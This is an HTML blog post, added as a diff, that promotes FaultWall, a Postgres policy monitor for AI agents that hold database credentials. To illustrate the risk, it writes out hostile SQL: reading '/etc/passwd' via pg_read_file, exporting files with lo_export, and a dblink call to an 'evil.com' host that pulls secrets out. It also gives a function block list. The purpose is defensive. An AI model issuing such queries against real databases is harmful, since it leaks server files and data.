@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>I Gave an AI Agent My Database Password — FaultWall</title>
+  <meta name="description" content="What happens when an LLM has real database credentials and the prompt goes sideways. A story about building a firewall for AI agents.">
+  <meta property="og:title" content="I Gave an AI Agent My Database Password">
+  <meta property="og:description" content="What happens when an LLM has real database credentials and the prompt goes sideways.">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://faultwall.com/blog/ai-agent-database-access">
+  <meta property="og:image" content="https://faultwall.com/banner.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://faultwall.com/banner.png">
+  <meta name="twitter:site" content="@FaultWall">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="icon" type="image/png" href="../favicon.png">
+  <style>
+    :root {
+      --bg: #050507;
+      --surface: #0c0c10;
+      --border: #1a1a22;
+      --text: #e8e8ed;
+      --muted: #71717a;
+      --accent: #7c5cfc;
+      --accent-light: #a78bfa;
+      --green: #38a169;
+      --red: #e53e3e;
+      --yellow: #f6ad55;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Inter', -apple-system, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.75;
+      font-size: 17px;
+    }
+    .container {
+      max-width: 720px;
+      margin: 0 auto;
+      padding: 80px 24px;
+    }
+    .back { color: var(--muted); text-decoration: none; font-size: 14px; }
+    .back:hover { color: var(--accent-light); }
+    h1 {
+      font-size: 2.2em;
+      font-weight: 800;
+      line-height: 1.2;
+      margin: 24px 0 8px;
+    }
+    .meta {
+      color: var(--muted);
+      font-size: 14px;
+      margin-bottom: 48px;
+    }
+    h2 {
+      font-size: 1.4em;
+      font-weight: 700;
+      margin: 48px 0 16px;
+      color: var(--text);
+    }
+    p { margin-bottom: 20px; }
+    a { color: var(--accent-light); }
+    code {
+      font-family: 'SF Mono', 'Fira Code', monospace;
+      background: var(--surface);
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 0.9em;
+    }
+    pre {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 20px;
+      overflow-x: auto;
+      margin: 24px 0;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+    pre code {
+      background: none;
+      padding: 0;
+      font-size: inherit;
+    }
+    .highlight {
+      background: rgba(124, 92, 252, 0.08);
+      border-left: 3px solid var(--accent);
+      padding: 16px 20px;
+      margin: 24px 0;
+      border-radius: 0 8px 8px 0;
+    }
+    .highlight p { margin-bottom: 0; }
+    .cta {
+      margin-top: 48px;
+      padding: 32px;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      text-align: center;
+    }
+    .cta a {
+      display: inline-block;
+      background: var(--accent);
+      color: white;
+      padding: 12px 32px;
+      border-radius: 8px;
+      text-decoration: none;
+      font-weight: 600;
+      margin: 8px;
+    }
+    .cta a:hover { opacity: 0.9; }
+    .cta p { color: var(--muted); font-size: 14px; margin-top: 12px; }
+    ul { margin: 0 0 20px 24px; }
+    li { margin-bottom: 8px; }
+    .tag {
+      display: inline-block;
+      background: rgba(124, 92, 252, 0.15);
+      color: var(--accent-light);
+      padding: 2px 10px;
+      border-radius: 12px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <a href="/" class="back">← faultwall.com</a>
+
+    <h1>I Gave an AI Agent My Database Password</h1>
+    <div class="meta">March 2026 · 6 min read</div>
+
+    <p>A few months ago I started giving AI agents direct access to our Postgres database. Data analysis, report generation, some automated ops stuff. You know the drill — build a tool, give it a connection string, let the LLM figure out the SQL.</p>
+
+    <p>It worked great. For about three weeks.</p>
+
+    <h2>The Incident</h2>
+
+    <p>One of our agents ran a full table scan across a 2M-row table. CPU spiked to 90% for three minutes. Nobody got paged because the query came from a legitimate database user — it looked like normal application traffic.</p>
+
+    <p>That's when it hit me. The agent wasn't doing anything malicious. The prompt just wasn't specific enough, so the LLM generated a query without a WHERE clause. Honest mistake. But that "honest mistake" could have been:</p>
+
+    <ul>
+      <li><code>DROP TABLE users;</code> — the agent had write permissions</li>
+      <li><code>SELECT * FROM payments;</code> — the agent didn't need payment data</li>
+      <li><code>SELECT lo_export(...);</code> — export large objects to the filesystem</li>
+      <li><code>SELECT pg_read_file('/etc/passwd');</code> — read server files through Postgres</li>
+      <li><code>SELECT dblink('host=evil.com ...')</code> — phone home to an external server</li>
+    </ul>
+
+    <p>All of these are valid SQL. All of them execute with the agent's database credentials. Postgres doesn't know or care that an AI generated the query.</p>
+
+    <h2>The "Confused Deputy" Problem</h2>
+
+    <p>This has a name in security: the <strong>confused deputy</strong>. Your AI agent has legitimate credentials. It's authorized to be there. But it's executing actions on behalf of a prompt — and prompts can be manipulated, hallucinated, or just poorly written.</p>
+
+    <div class="highlight">
+      <p>Traditional database security assumes the <em>identity</em> executing a query is the <em>intent</em> behind it. With AI agents, that assumption breaks. The agent is authorized. The query it generates might not be.</p>
+    </div>
+
+    <p>Postgres roles don't help much. They're static — an agent doing "summarize feedback" has the same permissions as when it's doing "delete old records." You can create read-only users, but most useful agent workflows need write access to at least some tables.</p>
+
+    <p>Row-level security? Better, but you're still trusting the agent to include the right predicates. And it doesn't protect against function calls like <code>pg_sleep(999)</code> or <code>lo_export()</code>.</p>
+
+    <h2>What I Built</h2>
+
+    <p>I built <a href="https://github.com/shreyasXV/faultwall">FaultWall</a> — a firewall that sits next to Postgres and enforces per-agent, per-task policies.</p>
+
+    <p>The idea: every agent identifies itself and declares what it's doing right now. FaultWall checks every query against that declaration.</p>
+
+<pre><code># policies.yaml
+agents:
+  cursor-ai:
+    missions:
+      summarize-feedback:
+        allowed_tables: [public.feedback]
+        allowed_operations: [SELECT]
+        conditions:
+          - "WHERE created_at > now() - interval '30 days'"
+      update-shipping:
+        allowed_tables: [public.orders]
+        allowed_operations: [SELECT, UPDATE]
+
+  langchain-agent:
+    missions:
+      analyze-data:
+        allowed_tables: [public.feedback, public.products]
+        allowed_operations: [SELECT]
+
+blocked_functions:
+  - pg_sleep
+  - pg_terminate_backend
+  - lo_export
+  - lo_import
+  - pg_read_file
+  - pg_read_binary_file
+  - dblink
+  - dblink_exec
+  - set_config</code></pre>
+
+    <p>Agents identify themselves through Postgres <code>application_name</code>:</p>
+
+<pre><code>SET application_name = 'agent:cursor-ai:mission:summarize-feedback';
+SELECT * FROM public.feedback WHERE created_at > now() - interval '30 days';
+-- ✅ Allowed</code></pre>
+
+<pre><code>SET application_name = 'agent:cursor-ai:mission:summarize-feedback';
+SELECT * FROM public.users;
+-- ❌ Blocked: table not in mission scope</code></pre>
+
+<pre><code>SET application_name = 'agent:cursor-ai:mission:summarize-feedback';
+SELECT pg_sleep(999);
+-- ❌ Blocked: function in global blocklist</code></pre>
+
+    <h2>How It Actually Works</h2>
+
+    <p>FaultWall is a single Go binary. No proxy, no sidecar container — just one process that polls <code>pg_stat_activity</code> and inspects active queries.</p>
+
+    <p>Every query goes through a real PostgreSQL AST parser — the same C parser that Postgres itself uses, wrapped in Go via <a href="https://github.com/pganalyze/pg_query_go">pg_query_go</a>. No regex. The parser extracts:</p>
+
+    <ul>
+      <li><strong>Operations:</strong> SELECT, INSERT, UPDATE, DELETE, DROP, TRUNCATE</li>
+      <li><strong>Tables:</strong> including CTEs, subqueries, JOINs — you can't hide a table reference</li>
+      <li><strong>Function calls:</strong> pg_sleep, lo_export, dblink — even nested inside SELECT</li>
+    </ul>
+
+    <p>This matters because regex-based parsers miss things like:</p>
+
+<pre><code>-- Regex thinks this is a harmless SELECT
+SELECT pg_sleep(999);
+SELECT lo_export(16389, '/tmp/dump.txt');
+SELECT * FROM dblink('host=evil.com dbname=loot', 'SELECT * FROM secrets');
+
+-- AST parser catches all of them</code></pre>
+
+    <p>Two enforcement modes:</p>
+    <ul>
+      <li><strong>Monitor:</strong> Log violations, don't block. Run this first to see what your agents actually do.</li>
+      <li><strong>Enforce:</strong> Kill violating queries via <code>pg_terminate_backend()</code>.</li>
+    </ul>
+
+<pre><code>DATABASE_URL=postgres://... \
+POLICY_ENFORCEMENT=enforce \
+POLICY_FILE=./policies.yaml \
+./faultwall</code></pre>
+
+    <h2>What It Catches</h2>
+
+    <p>I tested it with 11 scenarios covering the attacks I was most worried about:</p>
+
+    <ul>
+      <li>✅ Agent reads allowed table within mission — <span class="tag">allowed</span></li>
+      <li>❌ Agent touches table outside mission scope — <span class="tag">blocked</span></li>
+      <li>❌ Agent runs DELETE when only SELECT is allowed — <span class="tag">blocked</span></li>
+      <li>❌ Agent calls <code>pg_sleep(999)</code> — <span class="tag">blocked</span></li>
+      <li>❌ Agent calls <code>lo_export()</code> to dump files — <span class="tag">blocked</span></li>
+      <li>❌ Agent calls <code>pg_read_file('/etc/passwd')</code> — <span class="tag">blocked</span></li>
+      <li>❌ Unregistered agent tries anything — <span class="tag">blocked</span></li>
+      <li>❌ Connection without agent identity — <span class="tag">monitored</span></li>
+    </ul>
+
+    <p>All 11 passed on a real Postgres instance. Not unit tests — actual queries, actual enforcement, actual <code>pg_terminate_backend()</code> calls.</p>
+
+    <h2>Limitations (Being Honest)</h2>
+
+    <p>FaultWall polls <code>pg_stat_activity</code> every ~10 seconds. It's not an inline proxy. This means:</p>
+
+    <ul>
+      <li><strong>Short queries complete before detection.</strong> A fast <code>DROP TABLE</code> could execute before FaultWall sees it.</li>
+      <li><strong>Long-running queries get caught.</strong> Analytics queries, agent workloads, anything that runs for more than a few seconds.</li>
+      <li><strong>Agent identity is self-reported.</strong> <code>application_name</code> is spoofable. A malicious agent could claim to be a different agent.</li>
+    </ul>
+
+    <p>The honest answer: FaultWall is a seatbelt, not an airbag. It catches the accidental damage that happens 95% of the time — confused agents, bad prompts, scope creep. It won't stop a sophisticated attacker who's already inside your database with full credentials.</p>
+
+    <p>I'm working on an eBPF-based engine that intercepts queries at the kernel level (real-time, zero polling delay) and cryptographic agent identity (signed JWTs instead of application_name). But those aren't shipped yet and I'm not going to pretend they are.</p>
+
+    <h2>Who This Is For</h2>
+
+    <p>If you're giving AI agents database access — LangChain tools, Cursor, Claude, internal bots, whatever — and you don't have a policy layer between the agent and your data, you probably should.</p>
+
+    <p>FaultWall is MIT licensed, ~3000 lines of Go, no telemetry, no cloud dependency. One binary, one YAML file.</p>
+
+    <div class="cta">
+      <a href="https://github.com/shreyasXV/faultwall">GitHub</a>
+      <a href="https://faultwall.com" style="background: transparent; border: 1px solid var(--border); color: var(--text);">Learn more</a>
+      <p>MIT Licensed · One binary · No cloud dependency</p>
+    </div>
+  </div>
+</body>
+</html>
